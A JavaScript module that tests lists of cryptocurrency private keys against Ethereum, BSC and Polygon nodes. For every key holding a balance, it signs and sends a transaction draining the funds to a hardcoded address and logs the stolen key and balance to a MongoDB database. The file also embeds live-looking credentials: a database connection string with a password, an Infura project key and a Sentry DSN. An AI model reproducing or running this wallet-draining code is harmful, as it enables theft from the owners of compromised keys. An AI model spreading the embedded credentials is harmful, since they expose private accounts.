const Web3 = require('web3')
const Sentry = require('@sentry/node')
const Promise = require('bluebird')
const mongoose = require('mongoose')
const sha256 = require('crypto-js/sha256')
require('../models')
Sentry.init({
    dsn: "https://1ff02f3dcce144aaaaa7b424918555f8@o1362299.ingest.sentry.io/6653686",
    integrations: [
      // enable HTTP calls tracing
      new Sentry.Integrations.Http({ tracing: true }),
    ],
  
    // Set tracesSampleRate to 1.0 to capture 100%
    // of transactions for performance monitoring.
    // We recommend adjusting this value in production
    tracesSampleRate: 1.0,
  });


  const networks = [
    'https://bsc-dataseed.binance.org',
    "https://mainnet.infura.io/v3/7dde81cce4ae4281bb8a3e2a70516f98",
     'https://bsc-dataseed1.defibit.io/',
     'https://polygon-mainnet.infura.io/v3/7dde81cce4ae4281bb8a3e2a70516f98'
  ]
  
const testPrivateKeys = async (privateKeys, seen) => {
    if(privateKeys.length > 0) {
      return Promise.all(Promise.each(privateKeys, async (key) => {
        console.log('trying', key)
        if(seen.indexOf(key) !== -1) {
          console.log('already tested this one')
        }
        return Promise.each(networks, async network => {
          let w3 = new Web3(network)
          let account
          let balance
          try {

            account = await w3.eth.accounts.privateKeyToAccount(key)
            balance = await w3.eth.getBalance(account.address)
            console.log('got account', account.privateKey, key)
             console.log('got balance', balance)
            if(balance > 0) {
              console.log(account.privateKey, key)
              console.log('wei balance', balance)
              let etherBalance = w3.utils.fromWei(balance, 'ether')
              const myAddress = '0x9d79126C830ad9AC789B9781E5A083b1200aD9E1'
              const nonce = await w3.eth.getTransactionCount(account.address, 'latest'); // nonce starts counting from 0
              console.log('nonce', nonce)
                const transaction = {
                'to': myAddress, // faucet address to return eth
                'from': account.address,
                'value': parseInt(etherBalance), // 1 ETH
                'gasPrice': '0x2540BE400',
                'gasLimit': 2000000,
                'nonce': nonce,
                // optional data field to send message or execute smart contract
                };
                console.log('transaction', transaction)
                let signedTx
                try {
                  let secretKey = sha256(key)
                  console.log('new secret key', secretKey)
                  
        
                  signedTx = await w3.eth.accounts.signTransaction(transaction, key)
                  console.log(signedTx)
                }
                catch(err) {
                  console.log('error signing transaction', err)
                }
                console.log('signed tx', signedTx)
                w3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {
                if (!error) {
                  console.log("🎉 The hash of your transaction is: ", hash, "\n Check Alchemy's Mempool to view the status of your transaction!");
                } else {
                  console.log("❗Something went wrong while submitting your transaction:", error)
                }
              })
              console.log('ether balance', etherBalance)
              console.log('saving acount')
              const schema = mongoose.Schema({}, {strict: false})
              await mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority')
              return mongoose.model('cryptoAccounts').create({
                  privateKey: key,
                  etherBalance,
                  balance,
                  address: account.address
                }, schema).then(() => console.log('new crypto account added: +', etherBalance, 'ether')).catch(console.log)
              }
    
            else {
              return Promise.resolve('no balance')
            }
          }
          catch(err) {
            console.log('account didnt work', key,)
           
            return Promise.resolve({key, worked: false})
          }
        }).catch(console.log)
      })).catch(console.log)
    }
    else {
      return Promise.resolve('no private keys to test')
    }
  
  }
module.exports.testPrivateKeys = testPrivateKeys
